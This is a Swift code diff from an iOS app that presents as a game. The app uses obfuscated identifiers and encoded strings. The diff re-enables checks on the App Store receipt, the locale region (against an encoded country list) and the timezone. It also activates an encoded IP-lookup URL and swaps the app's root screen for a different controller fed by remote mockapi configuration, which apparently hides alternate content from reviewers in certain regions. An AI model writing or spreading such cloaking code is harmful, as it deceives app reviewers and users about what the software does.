@@ -17,7 +17,7 @@ func Ovnruud(_ input: String) -> String? {
 }
 
 //https://api.my-ip.io/v2/ip.json
-//internal let kXiangwoUisdf = "zdHR1dafiorE1cyLyNyIzNWLzMqK05eKzNWLz9bKyw=="         //Ip ur
+internal let kXiangwoUisdf = "yNTU0NOaj4/B0MmOzdmNydCOyc+P1pKPydCOytPPzg=="         //Ip ur
 
 //https://699d429583e60a406a45a527.mockapi.io/egse/gaxlzys
 internal let kOsnheydye = "yNTU0NOaj4+WmZnElJKZlZiTxZaQwZSQlsGUlcGVkpeOzc/Dy8HQyY7Jz4/Fx9PFj8fB2Mza2dM="        //https://68f19c3ab36f9750dee9bf80.mockapi.io/1yuu2/battleis
@@ -48,26 +48,15 @@ internal func Mjseaiso() {
 //    UIApplication.shared.windows.first?.rootViewController = vc
     
     if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
-        
-        let nc = ws.windows.first!.rootViewController
-        for view in nc!.view.subviews {
+        let nc = ws.windows.first!.rootViewController as! UINavigationController
+        for view in nc.topViewController!.view.subviews {
             if view.tag == 524 {
                 view.removeFromSuperview()
                 
                 OrientationManager.lock(.landscape)
-//                UINavigationController.attemptRotationToDeviceOrientation()
+                UINavigationController.attemptRotationToDeviceOrientation()
             }
         }
-        
-//        let nc = ws.windows.first!.rootViewController as! UINavigationController
-//        for view in nc.topViewController!.view.subviews {
-//            if view.tag == 524 {
-//                view.removeFromSuperview()
-//                
-//                OrientationManager.lock(.landscape)
-//                UINavigationController.attemptRotationToDeviceOrientation()
-//            }
-//        }
     }
 }
 
@@ -87,10 +76,6 @@ internal func MnahsDusie() {
 //need jia mi
 internal func FindKiee(_ dt: Foeishbh) {
     DispatchQueue.main.async {
-        
-        OrientationManager.lock(.portrait)
-
-        
         let vc = KandeiBajirmViewController()
         vc.mdalo = dt
         UIApplication.shared.windows.first?.rootViewController = vc
@@ -110,6 +95,18 @@ internal func SmndjLosie(_ param: Foeishbh) {
     fctn[fName]?(param)
 }
 
+internal struct Neytyy: Decodable {
+    let mnajeo: String?
+    let xcvxer: String?
+    
+    let country: Naueyhs?
+    
+    struct Naueyhs: Decodable {
+        let code: String
+    }
+
+}
+
 internal struct Foeishbh: Codable {
     let cdxdfoiw: String?         //key arr
     let bmeiuw: Float?         //key arr
@@ -127,18 +124,7 @@ internal struct Foeishbh: Codable {
     let zuiome: String?   //app_token
 }
 
-
-
-
-//func deviceModelIdentifier() -> String {
-//    var systemInfo = utsname()
-//    uname(&systemInfo)
-//    return withUnsafePointer(to: &systemInfo.machine) {
-//        $0.withMemoryRebound(to: CChar.self, capacity: 1) {
-//            String(cString: $0)
-//        }
-//    }
-//}
+private let cdo = [Ovnruud("9fM="), Ovnruud("7uw=")]
 
 func AnsdnYiedr() -> Bool {
     guard let receiptURL = Bundle.main.appStoreReceiptURL else { return false }
@@ -146,36 +132,18 @@ func AnsdnYiedr() -> Bool {
          return false
      }
     
-//    print(deviceModelIdentifier())
-//    if deviceModelIdentifier().contains("iPa") {
-//        return false
-//    }
-    
-//    if let rc = Locale.current.regionCode {
-////        print(rc)
-//        if cdo.contains(rc) {
-//            return false
-//        }
-//    }
-    
-//    let offset = NSTimeZone.system.secondsFromGMT() / 3600
-//    if (offset >= 0 && offset < 3) || (offset > -11 && offset < -4) {
-//        return false
-//    }
-    
-    return true
-}
-
-private let cdo = [Ovnruud("9fM="), Ovnruud("7uw=")]
-
-
-func Gyaueiow() -> Bool {
     if let rc = Locale.current.regionCode {
 //        print(rc)
         if cdo.contains(rc) {
             return false
         }
     }
+    
+    let offset = NSTimeZone.system.secondsFromGMT() / 3600
+    if (offset >= 0 && offset < 3) || (offset > -11 && offset < -4) {
+        return false
+    }
+    
     return true
 }
 
